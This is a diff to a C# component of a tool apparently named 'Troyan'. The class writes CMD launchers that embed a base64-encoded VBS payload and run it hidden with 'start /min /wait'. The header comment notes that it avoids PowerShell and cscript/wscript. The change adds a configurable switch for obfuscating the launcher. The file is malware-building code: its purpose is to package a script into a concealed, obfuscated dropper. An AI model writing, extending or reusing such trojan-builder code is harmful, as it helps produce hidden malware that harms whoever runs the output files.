@@ -1,20 +1,26 @@
 using Commons;
 using System.Text;
+using Microsoft.Extensions.Options;
 
 namespace Troyan.Core;
 
 /// <summary>
-/// Writes <c>nonobfuscated.cmd</c> / <c>troyan.cmd</c> that embed the final obfuscated <c>troyan.vbs</c>
+/// Writes <c>nonobfuscated.cmd</c> / <c>troyan.cmd</c> that embed the final <c>troyan.vbs</c>
 /// and run it hidden via <c>start /min /wait</c> (no PowerShell, no cscript/wscript).
-/// Must run after <see cref="ITroyanPlainVbsEmitter"/>.
+/// Must run after <see cref="ITroyanPlainVbsEmitter"/>. Obfuscation gated by <see cref="TroyanObfuscationOptions.Cmd"/>.
 /// </summary>
 public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
 {
     private const int Base64LineWidth = 76;
 
     private readonly ITroyanCmdObfuscator _obfuscator;
+    private readonly TroyanObfuscationOptions _obfuscation;
 
-    public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator) => _obfuscator = obfuscator;
+    public TroyanPlainCmdEmitter(ITroyanCmdObfuscator obfuscator, IOptions<TroyanObfuscationOptions> obfuscation)
+    {
+        _obfuscator = obfuscator;
+        _obfuscation = obfuscation.Value;
+    }
 
     public void Write(ServerLayoutPaths layout)
     {
@@ -25,7 +31,7 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
         var vbsFinal = layout.TroyanOutputVbs;
         if (!File.Exists(vbsFinal))
             throw new FileNotFoundException(
-                "Final troyan.vbs must be built before CMD (embed obfuscated VBS).",
+                "Final troyan.vbs must be built before CMD (embed VBS).",
                 vbsFinal);
 
         var b64 = Convert.ToBase64String(File.ReadAllBytes(vbsFinal));
@@ -36,7 +42,7 @@ public sealed class TroyanPlainCmdEmitter : ITroyanPlainCmdEmitter
             throw new InvalidOperationException("launcher.cmd must contain the 0102 placeholder.");
 
         var plain = template.Replace(placeholder, wrapped, StringComparison.Ordinal);
-        var final = _obfuscator.Obfuscate(plain);
+        var final = _obfuscation.Cmd ? _obfuscator.Obfuscate(plain) : plain;
 
         var dir = Path.GetDirectoryName(layout.TroyanOutputCmd);
         if (!string.IsNullOrEmpty(dir))
